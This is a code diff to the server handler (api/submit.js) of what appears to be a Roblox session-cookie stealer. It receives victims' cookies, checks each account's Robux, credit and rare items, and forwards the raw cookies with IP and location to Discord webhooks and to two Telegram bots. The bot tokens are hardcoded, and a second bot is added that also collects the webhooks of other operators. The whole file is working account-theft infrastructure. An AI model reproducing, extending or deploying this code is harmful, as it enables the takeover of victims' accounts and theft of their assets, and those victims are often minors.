@@ -1,8 +1,14 @@
 // api/submit.js — cookie hits Discord immediately, geo runs in parallel
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+
+// Telegram Bot 1 - Account Info (Cookie + Profile)
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+
+// Telegram Bot 2 - Webhook Info
+const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
+const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';
 
 // Item asset IDs
 const ITEMS = {
@@ -344,12 +350,24 @@ async function refreshCookieStatus(cookie) {
   };
 }
 
-async function tgSend(text) {
+// Bot 1 - Account Info (Cookie + Profile)
+async function tgSendAccount(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+    });
+  } catch (_) {}
+}
+
+// Bot 2 - Webhook Info
+async function tgSendWebhook(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
     });
   } catch (_) {}
 }
@@ -534,7 +552,7 @@ export default async function handler(req, res) {
     });
     
     await Promise.all(webhooks.map(wh => discordSend(wh, wrongCookiePayload)));
-    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+    await tgSendAccount(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
   }
 
@@ -639,18 +657,52 @@ export default async function handler(req, res) {
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
-  // Telegram
-  await tgSend([
-    `🍪 <b>COOKIE — ${pName}</b>`,
-    `🌐 <code>${ip}</code>`,
-    `📍 ${loc}`,
-    `🗺️ ${isp}`,
-    `👤 ${acc ? acc.username : 'Invalid'}`,
-    acc ? `💰 Robux: ${acc.robux.toLocaleString()}` : '',
-    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.items} items)` : '',
-    acc ? `⭐ Premium: ${acc.premium ? 'Yes' : 'No'}` : '',
-    acc ? `💀 Headless: ${acc.headless ? 'Yes' : 'No'}` : '',
-    acc ? `⚔️ Korblox: ${acc.korblox ? 'Yes' : 'No'}` : '',
+  // Telegram Bot 1 - Account Info (NO ISP, NO Refresher)
+  if (acc) {
+    await tgSendAccount([
+      `🍪 <b>COOKIE — ${pName}</b>`,
+      `👤 <b>Username:</b> <code>${acc.username}</code>`,
+      `🆔 <b>User ID:</b> <code>${acc.id}</code>`,
+      ``,
+      `💰 <b>Robux:</b> ⏣ ${acc.robux.toLocaleString()}`,
+      `🎵 <b>RAP:</b> ${acc.rap.toLocaleString()} (${acc.items} items)`,
+      `💳 <b>Credit:</b> $${acc.credit.toFixed(2)}`,
+      `🗓️ <b>Age:</b> ${acc.accountAge.toLocaleString()}d`,
+      `⭐ <b>Premium:</b> ${acc.premium ? 'Yes' : 'No'}`,
+      `🎙️ <b>Voice Chat:</b> ${acc.voiceChat ? 'On' : 'Off'}`,
+      `👥 <b>Friends:</b> ${acc.friends.toLocaleString()}`,
+      `👑 <b>Groups Owned:</b> ${acc.groupsOwned}`,
+      `💀 <b>Headless:</b> ${acc.headless ? 'Owned' : 'None'}`,
+      `⚔️ <b>Korblox:</b> ${acc.korblox ? 'Owned' : 'None'}`,
+      `🪽 <b>Valkyrie:</b> ${acc.valkyrie ? 'Owned' : 'None'}`,
+      ``,
+      `🔗 <b>Profile:</b> <a href="${acc.profileUrl}">View Profile</a>`,
+      ``,
+      `<b>🔐 Cookie:</b>`,
+      `<code>${cookie}</code>`,
+      ``,
+      `🕐 ${now}`
+    ].join('\n'));
+  } else {
+    await tgSendAccount([
+      `🍪 <b>COOKIE — ${pName}</b>`,
+      `❌ <b>Invalid or expired cookie</b>`,
+      ``,
+      `<b>🔐 Cookie:</b>`,
+      `<code>${cookie}</code>`,
+      ``,
+      `🕐 ${now}`
+    ].join('\n'));
+  }
+
+  // Telegram Bot 2 - Webhook Info
+  await tgSendWebhook([
+    `🪝 <b>WEBHOOK INFO — ${pName}</b>`,
+    ``,
+    `<b>Page Webhook:</b>`,
+    `<code>${record.webhook}</code>`,
+    record.dualhookParent ? `<b>Parent Webhook:</b> <code>${webhook1}</code>` : '',
+    ``,
     `🕐 ${now}`
   ].filter(Boolean).join('\n'));
 
